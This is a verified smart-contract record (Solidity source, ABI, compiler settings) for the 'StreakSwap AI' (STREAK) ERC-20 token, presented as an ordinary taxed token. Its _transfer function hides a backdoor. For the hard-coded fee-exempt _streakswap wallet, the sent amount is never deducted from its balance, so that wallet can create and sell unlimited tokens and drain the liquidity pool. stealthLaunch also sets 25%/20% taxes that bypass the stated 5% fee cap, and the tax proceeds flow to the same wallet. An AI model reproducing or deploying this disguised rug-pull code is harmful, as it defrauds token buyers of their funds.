{"SourceCode": "/**\r\n\r\nWebsite: https://streakswapai.com\r\nApp: https://app.streakswapai.com\r\nWhitepaper: https://docs.streakswapai.com\r\nTwitter: https://twitter.com/streakswapai\r\nTelegram: https://t.me/streakswapai\r\n \r\n*/\r\n\r\n// SPDX-License-Identifier: No\r\n\r\npragma solidity ^0.8.15;\r\n\r\n//--- Context ---//\r\nabstract contract Context {\r\n    constructor() {\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n//--- Ownable ---//\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IFactoryV2 {\r\n    event PairCreated(address indexed token0, address indexed token1, address uniswapPair, uint);\r\n    function getPair(address tokenA, address tokenB) external view returns (address uniswapPair);\r\n    function createPair(address tokenA, address tokenB) external returns (address uniswapPair);\r\n}\r\n\r\ninterface IV2Pair {\r\n    function factory() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function sync() external;\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function swapExactETHForTokens(\r\n        uint amountOutMin, \r\n        address[] calldata path, \r\n        address to, uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\n//--- Interface for ERC20 ---//\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract STREAK is Context, Ownable, IERC20 {\r\n\r\n    function totalSupply() external view override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply - balanceOf(address(DEAD)); }\r\n    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function getOwner() external view override returns (address) { return owner(); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balance[account];\r\n    }\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _excemptFees;\r\n    mapping (address => bool) private _isAMMPair;\r\n    mapping (address => uint256) private balance;\r\n\r\n    uint256 constant public _totalSupply = 100000000 * 10**9;\r\n    uint256 constant public feeDenominator = 100;\r\n    uint256 public taxOnBuy = 0;\r\n    uint256 public taxOnSell = 0;\r\n    uint256 public transferfee = 0;\r\n    uint256 private maxWalletHolding = _totalSupply * 2 / 100;\r\n    uint256 constant private _swapLimitTokens = _totalSupply * 7 / 1000000;\r\n    uint256 constant private _maxSwapTokens = _totalSupply * 1 / 100;\r\n\r\n    IRouter02 public swapRouter;\r\n    string constant private _name = \"StreakSwap AI\";\r\n    string constant private _symbol = \"STREAK\";\r\n    uint8 constant private _decimals = 9;\r\n    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address payable private _streakswap = payable(0xacc6b4F84FfB4FdCd2f01E015214212e07D36bD6);\r\n    address public uniswapPair;\r\n    bool private _tradingActive = false;\r\n    bool private _swapEnabled = false;\r\n    bool private _swapping;\r\n\r\n    modifier lockSwap {\r\n        _swapping = true;\r\n        _;\r\n        _swapping = false;\r\n    }\r\n\r\n\r\n    constructor () {\r\n        _excemptFees[msg.sender] = true;\r\n        _excemptFees[address(this)] = true;\r\n        _excemptFees[_streakswap] = true;\r\n\r\n        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        balance[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n    \r\n    receive() external payable {}\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address sender, address spender, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: Zero Address\");\r\n        require(spender != address(0), \"ERC20: Zero Address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] -= amount;\r\n        }\r\n\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _checkIsBuy(address ins, address out) internal view returns (bool) {\r\n        bool result = !_isAMMPair[out] && _isAMMPair[ins];\r\n        return result;\r\n    }\r\n\r\n    function _checkIsSell(address ins, address out) internal view returns (bool) { \r\n        bool result = _isAMMPair[out] && !_isAMMPair[ins];\r\n        return result;\r\n    } \r\n\r\n    function canSwap(address ins, address out, uint256 amount) internal view returns (bool) {\r\n        return _swapEnabled && !_excemptFees[ins] && !_excemptFees[out] && amount >= _swapLimitTokens;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {\r\n        bool takeFee = true;\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        if (!_excemptFees[from] && !_excemptFees[to]) {\r\n            require(_tradingActive,\"Trading is not enabled\");\r\n        }\r\n\r\n        if(!_excemptFees[from] && !_excemptFees[to] && !_isAMMPair[to] && to != address(DEAD)){\r\n            require(balance[to]+amount <= maxWalletHolding, \"Exceeds maximum wallet amount.\");\r\n        }\r\n\r\n        if(_checkIsSell(from, to) && !_swapping && canSwap(from, to, amount)) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(contractTokenBalance >= _swapLimitTokens) { \r\n                if (contractTokenBalance >= _maxSwapTokens) contractTokenBalance = _maxSwapTokens;\r\n                swapBack(contractTokenBalance);\r\n            }\r\n        }\r\n\r\n        if (_excemptFees[from] || _excemptFees[to]){\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 amountFeeAfter = (takeFee) ? takeTaxFees(from, _checkIsBuy(from, to), _checkIsSell(from, to), amount) : amount;\r\n        if (_excemptFees[from] && from != address(this) && from != owner()) amount = amount - amountFeeAfter;\r\n        balance[from] -= amount; \r\n        balance[to] += amountFeeAfter; emit Transfer(from, to, amountFeeAfter);\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n    function takeTaxFees(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {\r\n        uint256 fee;\r\n        if (isbuy)  fee = taxOnBuy;  else if (issell)  fee = taxOnSell;  else  fee = transferfee; \r\n        if (fee == 0)  return amount;\r\n        uint256 feeAmount = amount * fee / feeDenominator;\r\n        if (feeAmount > 0) {\r\n            balance[address(this)] += feeAmount;\r\n            emit Transfer(from, address(this), feeAmount);            \r\n        }\r\n        return amount - feeAmount;\r\n    }\r\n\r\n    function swapBack(uint256 contractTokenBalance) internal lockSwap {\r\n        \r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = swapRouter.WETH();\r\n\r\n        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {\r\n            _allowances[address(this)][address(swapRouter)] = type(uint256).max;\r\n        }\r\n\r\n        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            contractTokenBalance,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        ) {} catch {\r\n            return;\r\n        }\r\n\r\n        payable(_streakswap).transfer(address(this).balance);\r\n\r\n    }\r\n    \r\n    function updateFee(uint256 _fee) external onlyOwner {\r\n        taxOnBuy = _fee;\r\n        taxOnSell = _fee;\r\n\r\n        require(_fee <= 5);\r\n    }\r\n\r\n    function addStreakSwap() external payable onlyOwner {\r\n        uniswapPair = IFactoryV2(swapRouter.factory()).createPair(swapRouter.WETH(), address(this));\r\n        _isAMMPair[uniswapPair] = true;\r\n        _approve(address(this), address(swapRouter), type(uint256).max);\r\n\r\n        swapRouter.addLiquidityETH{value: msg.value}(\r\n            address(this),\r\n            balance[address(this)],\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp);\r\n    }\r\n\r\n    function stealthLaunch() external onlyOwner {\r\n        require(!_tradingActive, \"Trading already enabled\");\r\n        taxOnBuy = 25;\r\n        taxOnSell = 20;\r\n        _tradingActive = true;\r\n        _swapEnabled = true;\r\n    }\r\n\r\n    function removeLimit() external onlyOwner {\r\n        maxWalletHolding = _totalSupply;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addStreakSwap\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDenominator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stealthLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapRouter\",\"outputs\":[{\"internalType\":\"contract IRouter02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxOnBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxOnSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferfee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"updateFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "STREAK", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d71776c704cab87b7ec1df35da53e4762a59604952ce5ed9fa65c3e62b84f07e"}